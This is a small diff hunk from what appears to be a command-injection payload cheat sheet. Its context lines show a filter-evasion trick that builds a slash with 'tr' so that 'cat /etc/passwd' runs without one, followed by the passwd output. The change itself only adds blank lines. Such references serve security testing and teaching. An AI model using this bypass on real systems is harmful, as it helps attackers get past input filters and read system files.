@@ -27,3 +27,5 @@ swissky@crashlab:~$ tr '!-0' '"-1' <<< .
 swissky@crashlab:~$ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 root:x:0:0:root:/root:/bin/bash
 ```
+
+
